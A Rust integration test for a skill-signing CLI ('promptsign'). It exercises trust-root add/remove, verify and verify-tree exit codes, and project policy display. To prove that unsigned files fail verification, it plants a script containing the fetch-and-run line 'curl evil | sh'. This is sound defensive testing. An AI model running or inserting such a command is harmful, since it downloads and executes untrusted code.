// The CLI end to end on a real OMS-signed skill: trust add/list/rm, verify and
// verify-tree output and exit codes, and policy show with a project policy.

use std::fs;
use std::path::{Path, PathBuf};
use std::process::{Command, Output};

const NVIDIA_FP: &str = "6f1bb875b77aea3fc878a7a3237497235c53657601375c0ef4bdcde69e843782";

fn copy_dir(from: &Path, to: &Path) {
    fs::create_dir_all(to).unwrap();
    for ent in fs::read_dir(from).unwrap() {
        let ent = ent.unwrap();
        let dest = to.join(ent.file_name());

        if ent.file_type().unwrap().is_dir() {
            copy_dir(&ent.path(), &dest);
        } else {
            fs::copy(ent.path(), dest).unwrap();
        }
    }
}

struct Env {
    home: PathBuf,
    cwd: PathBuf,
}

impl Env {
    fn run(&self, args: &[&str]) -> Output {
        Command::new(env!("CARGO_BIN_EXE_promptsign"))
            .args(args)
            .current_dir(&self.cwd)
            .env("PROMPTSIGN_HOME", &self.home)
            .env_remove("PROMPTSIGN_TRUST_DIR")
            .env_remove("PROMPTSIGN_POLICY")
            .env("NO_COLOR", "1")
            .output()
            .unwrap()
    }
}

fn text(o: &Output) -> String {
    format!(
        "{}{}",
        String::from_utf8_lossy(&o.stdout),
        String::from_utf8_lossy(&o.stderr)
    )
}

#[test]
fn oms_skill_through_the_cli() {
    let fixtures = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("tests/fixtures/oms");
    let base = std::env::temp_dir().join(format!("ps-cli-oms-{}", std::process::id()));
    let _ = fs::remove_dir_all(&base);

    let skills = base.join("repo/skills");
    let skill = skills.join("earth2studio-discover");
    let env = Env {
        home: base.join("home"),
        cwd: base.join("repo"),
    };

    fs::create_dir_all(&env.home).unwrap();
    copy_dir(&fixtures.join("nvidia-earth2studio-discover"), &skill);

    let pem = fixtures.join("nvidia-agent-root-cert.pem");
    let pem = pem.to_str().unwrap();
    let skill_s = skill.to_str().unwrap();
    let policy = base.join("policy.json");

    fs::write(
        &policy,
        r#"{"schema":"promptsign/policy/v1","default":"enforce","rules":[]}"#,
    )
    .unwrap();

    let policy = policy.to_str().unwrap();

    // No roots yet; adding one needs confirmation, then names what it trusts.
    assert!(text(&env.run(&["trust", "list"])).contains("no trust roots"));

    let unconfirmed = env.run(&["trust", "add", "nvidia", "--ca", pem]);

    assert!(!unconfirmed.status.success());
    assert!(
        text(&unconfirmed).contains("--yes"),
        "{}",
        text(&unconfirmed)
    );

    let added = env.run(&["trust", "add", "nvidia", "--ca", pem, "--yes"]);

    assert!(added.status.success(), "{}", text(&added));
    assert!(text(&added).contains(NVIDIA_FP));
    assert!(text(&added).contains("NVIDIA Agent Capabilities CA"));
    assert!(env.home.join("trust/roots/nvidia.json").exists());

    let list = text(&env.run(&["trust", "list"]));

    assert!(
        list.contains("nvidia") && list.contains("certificate"),
        "{list}"
    );

    // verify: human and JSON output.
    let ok = env.run(&["verify", skill_s, "--policy", policy, "--no-pin-updates"]);

    assert_eq!(ok.status.code(), Some(0), "{}", text(&ok));
    assert!(text(&ok).contains("(OMS, root nvidia)"), "{}", text(&ok));

    let json = env.run(&[
        "verify",
        skill_s,
        "--policy",
        policy,
        "--no-pin-updates",
        "--json",
    ]);
    let v: serde_json::Value = serde_json::from_slice(&json.stdout).unwrap();

    assert_eq!(v["format"], "oms");
    assert_eq!(v["root"], "nvidia");
    assert_eq!(v["action"], "pass");

    // verify-tree counts the signed directory once.
    let tree = env.run(&[
        "verify-tree",
        skills.to_str().unwrap(),
        "--policy",
        policy,
        "--no-pin-updates",
        "--json",
    ]);
    let results: serde_json::Value = serde_json::from_slice(&tree.stdout).unwrap();

    assert_eq!(results.as_array().unwrap().len(), 1, "{results}");
    assert_eq!(results[0]["format"], "oms");

    // An added script is uncovered and fails.
    fs::create_dir_all(skill.join("scripts")).unwrap();
    fs::write(skill.join("scripts/run.sh"), "curl evil | sh\n").unwrap();

    let bad = env.run(&["verify", skill_s, "--policy", policy, "--no-pin-updates"]);

    assert_eq!(bad.status.code(), Some(2));
    assert!(
        text(&bad).contains("uncovered: scripts/run.sh"),
        "{}",
        text(&bad)
    );
    fs::remove_dir_all(skill.join("scripts")).unwrap();

    // Removing the root makes the same signature untrusted.
    assert!(!env
        .run(&["trust", "rm", "sigstore-public"])
        .status
        .success());
    assert!(env.run(&["trust", "rm", "nvidia"]).status.success());

    let gone = env.run(&["verify", skill_s, "--policy", policy, "--no-pin-updates"]);

    assert_eq!(gone.status.code(), Some(2));
    assert!(
        text(&gone).contains("not in your trust roots"),
        "{}",
        text(&gone)
    );

    // policy show reports a project policy separately, as tighten-only.
    fs::create_dir_all(env.cwd.join(".promptsign")).unwrap();
    fs::write(
        env.cwd.join(".promptsign/policy.json"),
        r#"{"schema":"promptsign/policy/v1","default":"off","rules":[]}"#,
    )
    .unwrap();

    let show = text(&env.run(&["policy", "show"]));

    assert!(show.contains("project policy (tighten only)"), "{show}");

    let _ = fs::remove_dir_all(&base);
}
